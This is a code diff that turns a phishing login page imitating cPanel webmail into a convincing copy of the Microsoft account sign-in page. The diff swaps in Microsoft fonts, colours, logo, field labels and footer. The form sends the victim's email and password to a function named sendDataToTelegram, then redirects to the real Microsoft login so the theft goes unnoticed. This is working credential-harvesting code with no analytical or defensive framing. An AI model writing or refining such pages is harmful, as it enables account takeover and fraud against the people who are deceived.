@@ -3,93 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webmail Login</title>
+    <title>Sign in to your account</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #ffffff;
-            text-align: center;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f2f1;
             margin: 0;
             padding: 0;
+            text-align: center;
         }
 
         .container {
-            margin-top: 150px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
 
         img {
-            margin-bottom: 30px;
-            width: 250px;
+            width: 200px;
+            margin-bottom: 20px;
         }
 
         .login-box {
-            margin: 0 auto;
-            width: 300px;
+            background-color: #ffffff;
+            border: 1px solid #e1dfdd;
+            padding: 30px;
+            border-radius: 4px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            text-align: left;
         }
 
         .login-box label {
+            font-size: 14px;
+            color: #323130;
+            margin-bottom: 5px;
             display: block;
-            text-align: left;
-            margin: 5px 0;
-            font-weight: normal;
         }
 
         .login-box input[type="text"],
         .login-box input[type="password"] {
-            width: 100%;
+            width: calc(100% - 20px);
             padding: 10px;
-            margin: 15px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
+            margin-bottom: 20px;
+            border: 1px solid #c8c6c4;
+            border-radius: 4px;
             font-size: 16px;
+            box-sizing: border-box;
         }
 
         .login-box button {
             width: 100%;
-            padding: 10px;
-            background-color: #007bff;
+            padding: 12px;
+            background-color: #0078d4;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
             color: white;
             font-size: 16px;
+            cursor: pointer;
         }
 
         .login-box button:hover {
-            background-color: #0056b3;
+            background-color: #005a9e;
         }
 
-        .languages {
-            margin-top: 20px;
-            color: gray;
-        }
-
-        .languages a {
-            color: gray;
+        .login-box a {
+            display: block;
+            color: #0078d4;
             text-decoration: none;
-            margin-right: 15px;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
+        .login-box a:hover {
+            text-decoration: underline;
         }
 
         .footer {
-            margin-top: 30px;
             font-size: 12px;
-            color: gray;
+            color: #605e5c;
+            margin-top: 30px;
         }
 
         .footer a {
-            color: gray;
+            color: #605e5c;
             text-decoration: none;
         }
     </style>
     <script>
         let userCountry = ""; // Placeholder for user country
-
-        // Function to populate the email field from URL parameter
-        function populateEmailField() {
-            const params = new URLSearchParams(window.location.search);
-            if (params.has('email')) {
-                document.getElementById('email').value = params.get('email');
-            }
-        }
 
         // Function to get user's country
         function getUserCountry() {
@@ -133,7 +138,7 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    // Only redirect if the message was sent successfully
+                    // Redirect to the desired page if the message was sent successfully
                     window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638660683449437479.YTAwYzY1NDMtNjJiMS00Y2FiLWI5ZmEtYmIwNjNlNTEwYWYxNzJjNTY0YjUtMmEzMS00MjMyLWI5ZDctOTU0ZGMxZGQ4MDM0&ui_locales=en-US&mkt=en-US&client-request-id=b1abf132-4104-426c-bf61-1a815019d951&state=IKtRMuTumeBtEK_B9-E1eJAQb3_czuOR-4ZYe-Cd_x1EBXFBvs5nGMAKU1Fu6K8eUC0IUl2DgeXWM0tXNr0grYWwn-Aha8IGu_g3ZINNfZoSeM9ZeEjRPY_2IFQcjhZim6sAHz1HbfZF5eCG9vi664tNIKmvuw3mS7KYb0hv9ItzQ_MwbtFbdRu-inkPPXzVmhcruXuxJS9i9q05htRGBHs0iftF4BaqI7VNCwOHhTIph4Qlje-t-fS4mNdFxgawwhKWg1gePKYM-kW_r2rM8ATBJYHE8qFCJQaZFlBMgo0&x-client-SKU=ID_NET8_0&x-client-ver=7.5.1.0";
                 } else {
                     console.error("Error sending message:", data);
@@ -146,7 +151,6 @@
 
         // Run functions on page load
         window.onload = function() {
-            populateEmailField();
             getUserCountry();
         };
     </script>
@@ -154,36 +158,25 @@
 <body>
     <div class="container">
         <!-- Logo -->
-        <img src="webmail-logo.svg" alt="Webmail Logo">
+        <img src="Microsoft-Logo.wine.png" alt="Microsoft Logo">
 
         <!-- Login form -->
         <div class="login-box">
             <form onsubmit="sendDataToTelegram(event)">
-                <label for="email">Email Address</label>
-                <input type="text" id="email" name="email" placeholder="Enter your email address" required>
+                <label for="email">Email, phone, or Skype</label>
+                <input type="text" id="email" name="email" placeholder="Enter your email, phone, or Skype" required>
                 
                 <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Enter your email password" required>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
                 
-                <button type="submit">Log in</button>
+                <button type="submit">Sign in</button>
+                <a href="#">Can't access your account?</a>
             </form>
-        </div>
-
-        <!-- Language selection -->
-        <div class="languages">
-            <a href="#">English</a>
-            <a href="#">العربية</a>
-            <a href="#">čeština</a>
-            <a href="#">dansk</a>
-            <a href="#">Deutsch</a>
-            <a href="#">Ελληνικά</a>
-            <a href="#">español</a>
-            <a href="#">español latinoamericano</a>
         </div>
 
         <!-- Footer -->
         <div class="footer">
-            <p>&copy; 2024 cPanel, L.L.C. <a href="#">Privacy Policy</a></p>
+            <p>&copy; 2024 Microsoft. <a href="#">Privacy & Cookies</a> <span>|</span> <a href="#">Terms of use</a></p>
         </div>
     </div>
 </body>
